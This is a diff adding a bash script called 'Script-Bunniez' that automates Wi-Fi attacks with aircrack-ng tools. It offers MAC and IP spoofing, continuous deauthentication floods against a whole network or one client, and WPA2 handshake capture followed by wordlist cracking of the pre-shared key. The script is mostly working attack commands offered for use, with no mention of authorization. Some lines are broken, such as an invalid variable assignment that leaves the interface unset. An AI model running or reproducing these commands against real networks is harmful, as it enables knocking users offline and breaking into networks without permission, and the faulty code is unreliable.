@@ -1,0 +1,127 @@
+#!/bin/bash
+#This file includes code from the GNU GPL-2.0 licensed projects aircrack-ng and wireshark. For more information, please see https://github.com/aircrack-ng/aircrack-ng and https://github.com/wireshark/wireshark
+#Run Script-Bunniez as sudo/root
+cd /
+echo "   _____           _       __  ____                    _"
+echo "  / ___/__________(_)___  / /_/ __ )__  ______  ____  (_)__  ____ "
+echo "  \__ \/ ___/ ___/ / __ \/ __/ __  / / / / __ \/ __ \/ / _ \/_  / (\_/)"
+echo " ___/ / /__/ /  / / /_/ / /_/ /_/ / /_/ / / / / / / / /  __/ / /_ (o.o)"
+echo "/____/\___/_/  /_/ .___/\__/_____/\__,_/_/ /_/_/ /_/_/\___/ /___/ (> <)"
+echo "                /_/ "
+sleep 2s
+echo "Script-Bunniez(IEEE 802.11 WiFi-Deauthing/WPA2cracking-Script)"; sleep 2s
+#animation of bunny
+read -p "Have you downloaded  wireshark, airodump-ng, aireplay-ng, airmon-ng, and aircrack-ng? (y/n): " DOWN
+
+if [ $DOWN == "y" ] || [ $DOWN == "Y" ]; then
+echo "Great, lets move on!"
+else
+echo "Lets Download these now!"; sleep 2s
+echo "Updating apt..."
+apt update; sleep 10s
+echo "Installing Airmon-ng..."; sleep 2s
+apt install airmon-ng; sleep 10s 
+echo "Installing Aircrack-ng..."; sleep 2s
+apt install aircrack-ng;sleep 10s 
+echo "Installing Wireshark..."; sleep 2s
+apt install wireshark; sleep 10s
+echo "Installing Aireplay-ng..."; sleep 2s
+apt install aireplay-ng; sleep 10s
+echo "Installing Airodump-ng..."; sleep 2s 
+apt install airodump-ng; sleep 10s; fi
+
+read -p "Have you plugged in your 802.11x NIC adapter? (y/n): " INPUT
+
+if [ "$INPUT" == "y" ] || [ "$INPUT" == "Y" ]; then
+  echo "Great! Let's get started"
+  # Capture the output of iwconfig
+  iwconfig_output=$(iwconfig)
+  # Parse the output to find the active interface for the NIC plugged in
+  active_interface=$(echo "$iwconfig_output" | grep "IEEE 802.11" | awk '{print $1}')
+  $active_interface = IFACE
+  echo "The Current NIC Interface Being Used: $IFACE"
+else
+  echo "Please plug in your NIC and put y for the answer, then rerun the script."; sleep 3s; exit 1; fi
+sleep 2s
+read -p "Would you like to spoof your ip, netmask, broadcast, and MAC addresses for an extra layer of security? (y/n): " SPOOF
+
+if [ $SPOOF == "y" ] || [ $SPOOF == "Y" ]; then
+echo "Lets Spoof The IP, NetMask, Broadcast, and MAC"; sleep 2s
+echo "The addresses are going to be spoofed to 192.168.181.115 for ip, 255.255.0.0 for netmask, 192.168.1.255 for broadcast, and 00:11:22:33:44:55 for the MAC address"; sleep 3s
+ifconfig eth0 down
+sleep 0.5
+ifconfig eth0 hw ether 00:11:22:33:44:55
+sleep 0.5
+ifconfig eth0 192.168.181.115 netmask 255.255.0.0 broadcast 192.168.1.255
+sleep 0.5
+ifconfig eth0 up
+sleep 0.5
+dhclient eth0
+sleep 0.5
+service NetworkManager restart; sleep 1s
+else
+echo "No problem, moving on..."; fi; sleep 3s
+
+echo "Now lets figure out the target WiFi's BSSID"; sleep 2s
+echo "Starting airmon-ng and then airodump-ng to display the WiFis' Info"; sleep 2s
+airmon-ng stop $IFACE
+sleep 0.2s
+airmon-ng check kill
+sleep 0.2s
+airmon-ng start $IFACE
+sleep 2s
+echo "Dumping the Network's Info Around You: "; sleep 3s
+airodump-ng $IFACE; sleep 5s 
+echo "Using the data from airodump-ng, plug In These Variables for WiFi/Client-Deauthing OR WiFi Password Cracking: "    
+read -p "BSSID of Target WiFi Here: " BSSID
+read -p "BSSID's Channel: " CHAN   
+read -p "MAC of Target/Client <Optional> (Specific client deauth attacks): " CLIENT; sleep 5s
+echo "What would you like to do today?" 
+read -p "Choose one; WiFi-Deauth(w), Client-Deauth(c), or  WiFi-Password(p): " ANSWER
+
+if [ "$ANSWER" == "c" ] || [ "$ANSWER" == "C" ]; then
+echo "The client $CLIENT is now being deauthenticated off the network..." 
+aireplay-ng -0 0 -a $BSSID -c $CLIENT; sleep 3s
+echo "Opening Wireshark to Capture The Poop Storm"
+wireshark; sleep 5s
+echo "Done!"
+
+elif [ "$ANSWER" == "w" ] || [ "$ANSWER" == "W" ]; then
+echo "Lets Get to it, WiFi Deauthing time!"
+aireplay-ng $IFACE -0 0 -a $BSSID; sleep 3s
+echo "Wifi Is Being Deauthed Now..."; sleep 3s
+echo "Opening Wireshark to Capture The Poop Storm: "; sleep 4s
+wireshark; sleep 5s
+echo "Done!"
+
+elif [ "$ANSWER" == "p" ] || [ "$ANSWER" == "P" ]; then
+echo "Lets Get That WiFi Password!"; sleep 3s
+echo "Time to hop on the WiFi and poop the PSK(Pre-Shared Key), running airodump: "
+#animation of bunny hopping
+airodump-ng -c $CHAN --bssid $BSSID -w psk $IFACE; sleep 10s
+echo "Wait for the PSK to be cracked!"; sleep 60s
+echo "Once that PSK has been pooped out, proceed"; sleep 15s
+read -p "Specify the name of the PSK-pcap file generated format, [psk-##.cap]: " PSK; sleep 5s
+read -p "Write the path to a custom made or pre-built worldlist such as /usr/share/wordlists/rockyou.txt here: " WORD
+sleep 12s
+echo "Time to crack the WiFi's Password, running aircrack-ng..."; sleep 3s
+aircrack-ng -w $WORD -b $BSSID $PSK; sleep 20s
+echo "The process is still running.."; sleep 20s
+echo "You should now have the password, if not, try adding some new custom strings for possible WiFi passwords, using a tool such as crunch"; sleep 2s
+echo "Done!"
+
+else
+echo "Please rerun the script and choose one of these: Client-Deauth(c), WiFi-Deauth(w), or WiFi-Passwd(p)"
+sleep 3s; exit 1; fi; sleep 2s
+echo "      /\   /\ "
+echo "      ||___|| "
+echo "      \0\_\0/ "
+echo "       \_v_/ "
+echo "       / ||| "
+echo "   8  // ||| "
+echo "    \|_/\_|/ "
+echo "     (    )  "
+echo "      |  |  "
+echo "     m    m "  
+sleep 1s
+echo "Thanks for using Script-Bunniez!"
